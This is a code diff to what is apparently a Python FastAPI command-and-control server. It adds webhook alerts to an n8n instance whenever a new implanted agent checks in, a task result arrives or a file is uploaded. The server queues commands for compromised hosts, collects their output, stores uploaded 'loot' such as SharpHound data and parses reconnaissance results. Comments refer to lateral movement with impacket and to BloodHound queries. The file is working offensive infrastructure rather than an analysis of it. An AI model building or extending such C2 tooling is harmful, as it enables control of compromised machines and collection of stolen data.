@@ -1,15 +1,26 @@
-from fastapi import FastAPI, HTTPException, UploadFile, File, Form
+from fastapi import FastAPI, HTTPException, UploadFile, File, Form, BackgroundTasks
 from fastapi.staticfiles import StaticFiles
 from pydantic import BaseModel
 from typing import Optional
 import json
 import os
+import requests
 from database import init_db, migrate_db, ensure_server_agent, get_conn
 # from impacket_wrapper import wmi_exec, smb_exec   # disabled — lateral movement via agent tools
 from pivot_manager import ensure_interface, add_route, del_route
 # import bloodhound_client as bh                    # disabled — BH queries done via SharpHound on agent
 
 app = FastAPI()
+
+N8N_WEBHOOK_URL = os.getenv("N8N_WEBHOOK_URL", "http://127.0.0.1:5678/webhook/c2-events")
+
+def _notify_n8n(event: str, payload: dict):
+    """Fire-and-forget webhook notification to n8n. Never raises."""
+    try:
+        requests.post(N8N_WEBHOOK_URL, json={"event": event, **payload}, timeout=5)
+    except Exception:
+        pass
+
 
 FILES_DIR = os.path.join(os.path.dirname(__file__), "files")
 LOOT_DIR  = os.path.join(os.path.dirname(__file__), "loot")
@@ -31,6 +42,7 @@ class AgentCheckin(BaseModel):
     agent_id: str
     hostname: str
     username: str
+    ip: str = ""
 
 class TaskResult(BaseModel):
     task_id: int
@@ -62,17 +74,24 @@ class TunnelRegister(BaseModel):
 # ── Agent endpoints ───────────────────────────────────────────────────────────
 
 @app.post("/checkin")
-def checkin(data: AgentCheckin):
+def checkin(data: AgentCheckin, background_tasks: BackgroundTasks):
     with get_conn() as conn:
+        # Detect new agent before upsert
+        existing = conn.execute(
+            "SELECT agent_id FROM agents WHERE agent_id = ?", (data.agent_id,)
+        ).fetchone()
+        is_new = existing is None
+
         # Upsert agent
         conn.execute("""
-            INSERT INTO agents (agent_id, hostname, username)
-            VALUES (?, ?, ?)
+            INSERT INTO agents (agent_id, hostname, username, ip)
+            VALUES (?, ?, ?, ?)
             ON CONFLICT(agent_id) DO UPDATE SET
                 last_seen = datetime('now'),
                 hostname  = excluded.hostname,
-                username  = excluded.username
-        """, (data.agent_id, data.hostname, data.username))
+                username  = excluded.username,
+                ip        = excluded.ip
+        """, (data.agent_id, data.hostname, data.username, data.ip))
 
         # Grab oldest pending task for this agent
         row = conn.execute("""
@@ -87,15 +106,27 @@ def checkin(data: AgentCheckin):
                 "UPDATE tasks SET status = 'sent' WHERE task_id = ?",
                 (row["task_id"],)
             )
-            print(f"[*] Check-in: {data.username}@{data.hostname} → task {row['task_id']} [{row['task_type']}]: {row['instruction']}")
-            return {"task_id": row["task_id"], "task_type": row["task_type"], "instruction": row["instruction"]}
 
-    print(f"[*] Check-in: {data.username}@{data.hostname} — no tasks queued")
+    if is_new:
+        print(f"[+] New agent: {data.username}@{data.hostname} ({data.ip})")
+        background_tasks.add_task(_notify_n8n, "agent_new", {
+            "agent_id": data.agent_id,
+            "hostname": data.hostname,
+            "username": data.username,
+            "ip":       data.ip
+        })
+    else:
+        print(f"[*] Check-in: {data.username}@{data.hostname} ({data.ip})")
+
+    if row:
+        print(f"    → task {row['task_id']} [{row['task_type']}]: {row['instruction']}")
+        return {"task_id": row["task_id"], "task_type": row["task_type"], "instruction": row["instruction"]}
+
     return {"task_id": None, "task_type": None, "instruction": None}
 
 
 @app.post("/result")
-def receive_result(data: TaskResult):
+def receive_result(data: TaskResult, background_tasks: BackgroundTasks):
     with get_conn() as conn:
         task = conn.execute(
             "SELECT task_id, task_type FROM tasks WHERE task_id = ? AND agent_id = ?",
@@ -117,6 +148,14 @@ def receive_result(data: TaskResult):
             _store_recon_hosts(conn, data.agent_id, data.output)
 
     print(f"[+] Result for task {data.task_id} [{task['task_type']}] from {data.agent_id}:\n{data.output}")
+
+    background_tasks.add_task(_notify_n8n, "task_result", {
+        "task_id":   data.task_id,
+        "agent_id":  data.agent_id,
+        "task_type": task["task_type"],
+        "output":    data.output
+    })
+
     return {"status": "ok"}
 
 
@@ -146,7 +185,7 @@ def _store_recon_hosts(conn, agent_id: str, output: str):
 # ── File upload (agent → server) ──────────────────────────────────────────────
 
 @app.post("/upload")
-async def upload_file(agent_id: str = Form(...), file: UploadFile = File(...)):
+async def upload_file(background_tasks: BackgroundTasks, agent_id: str = Form(...), file: UploadFile = File(...)):
     """Agent uploads a file to the server (e.g. SharpHound ZIP output)."""
     agent_dir = os.path.join(LOOT_DIR, agent_id)
     os.makedirs(agent_dir, exist_ok=True)
@@ -157,6 +196,14 @@ async def upload_file(agent_id: str = Form(...), file: UploadFile = File(...)):
         f.write(content)
 
     print(f"[+] Upload from {agent_id}: {file.filename} ({len(content)} bytes) → {dest}")
+
+    background_tasks.add_task(_notify_n8n, "file_uploaded", {
+        "agent_id": agent_id,
+        "filename": file.filename,
+        "size":     len(content),
+        "path":     dest
+    })
+
     return {"status": "ok", "filename": file.filename, "size": len(content)}
 
 
